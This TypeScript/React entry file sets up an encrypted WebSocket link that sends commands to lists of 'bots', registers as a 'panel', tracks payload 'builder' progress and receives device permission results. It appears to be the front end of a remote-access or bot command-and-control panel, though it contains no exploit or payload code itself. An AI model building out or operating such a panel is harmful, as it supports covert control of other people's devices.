/*  WebSocket singleton for the React panel
 *  -------------------------------------------------------------- */
import React   from "react";
import App     from "./App";
import { Provider } from "react-redux";
import "./i18nConfig";
import { store } from "@Store";
import ReactDOM from "react-dom/client";
import dayjs   from "dayjs";
import utc     from "dayjs/plugin/utc";
import tz      from "dayjs/plugin/timezone";
import AppThemeProvider from "./Theme/AppThemeProvider";

import mitt              from "mitt";
import { v4 as uuid }     from "uuid";
import { encrypt, decrypt } from "@Thunks/Commands/Crypto";

/* ------------------------------------------------------------------ */
/*  day-js                                                            */
/* ------------------------------------------------------------------ */
dayjs.extend(utc);
dayjs.extend(tz);
dayjs.tz.setDefault(import.meta.env.VITE_TIMEZONE || "UTC");

/* ------------------------------------------------------------------ */
/*  PUBLIC EVENT BUS  (tiny 1-KB dependency)                          */
/* ------------------------------------------------------------------ */
export const wsBus = mitt<{
  permission_result: {
    cmdId:   string;
    botId:   string;
    result:  "granted" | "denied";
    granted: string[];
    neverAskAgain: boolean;
  };
}>();

/* ------------------------------------------------------------------ */
/*  connection state                                                  */
/* ------------------------------------------------------------------ */
export let socket: WebSocket | null = null;
let   shouldReconnect = true;
let   retryTimeout    = 1000;
export let commandQueue: any[] = [];

const wsUrl: string = import.meta.env.VITE_WEBSOCKET_URL;
const pending: Record<string, (payload: any) => void> = {};

export function setShouldReconnect(value: boolean) {
  shouldReconnect = value;
}
/* ------------------------------------------------------------------ */
/*  helper to send a command and await **single** reply               */
/* ------------------------------------------------------------------ */
export function sendBotCommand(opts: {
  command : string;
  payload : any;
  botIds  : string[];
}): Promise<any> {
  const cmdId = uuid();

  socket?.send(
    encrypt(
      JSON.stringify({
        event : "sendCommands",
        uuid  : cmdId,         // panel-side correlation key
        ...opts
      })
    )
  );

  return new Promise(res => (pending[cmdId] = res));
}

/* ------------------------------------------------------------------ */
/*  socket connect / reconnect                                        */
/* ------------------------------------------------------------------ */
export function connectWebSocket() {
  try {
    socket = new WebSocket(wsUrl);

    socket.addEventListener("open", () => {
      console.log("[WS] connected →", wsUrl);
      socket!.send(encrypt(JSON.stringify({ event: "panel_register" })));
      retryTimeout = 1000;
    });
    

    socket.addEventListener("close", ev => {
      console.warn("[WS] closed", ev.code, ev.reason);
      if (shouldReconnect) {
        setTimeout(connectWebSocket, retryTimeout);
        retryTimeout = Math.min(retryTimeout * 2, 30000);
      }
    });

    socket.addEventListener("error", err => {
      console.error("[WS] error", err);
      socket?.close();
    });

    /* ----------------------------- ALL INCOMING -------------------- */
    socket.addEventListener("message", ev => {
      let data: any;
      try {
        data = JSON.parse(decrypt(ev.data));
      } catch (e) {
        console.error("[WS] decrypt/parse failed", e);
        return;
      }

      // 1) resolve promise if we were waiting for this cmdId ----------
      if (data.cmdId && pending[data.cmdId]) {
        pending[data.cmdId](data);
        delete pending[data.cmdId];
      }

      // 2) broadcast to any listeners (e.g. toast) -------------------
      if (data.event === "permission_result") {
        wsBus.emit("permission_result", data);
      }

      // 3) existing Redux wiring -------------------------------------
      switch (data.event) {
        case "registered_successfully":
          console.info("[WS] panel accepted");
          break;

        case "builder:start":
        case "builder:progress":
        case "builder:error":
        case "builder:complete":
          store.dispatch({
            type   : "BUILDER_SOCKET_EVENT",
            payload: { eventType: data.event, data: data.payload }
          });
          break;

        default:
          // silently ignore others
          break;
      }
    });
  } catch (err) {
    console.error("[WS] cannot open", err);
    setTimeout(connectWebSocket, retryTimeout);
  }
}

export function stopReconnection() {
  setShouldReconnect(false);
  if (socket) {
    socket.close();
  }
}

/* ------------------------------------------------------------------ */
/*  kick-off                                                           */
/* ------------------------------------------------------------------ */
connectWebSocket();

/* ------------------------------------------------------------------ */
/*  render react                                                      */
/* ------------------------------------------------------------------ */
const rootEl = document.getElementById("root")!;
ReactDOM.createRoot(rootEl).render(
  <Provider store={store}>
    <AppThemeProvider>
      <App />
    </AppThemeProvider>
  </Provider>
);
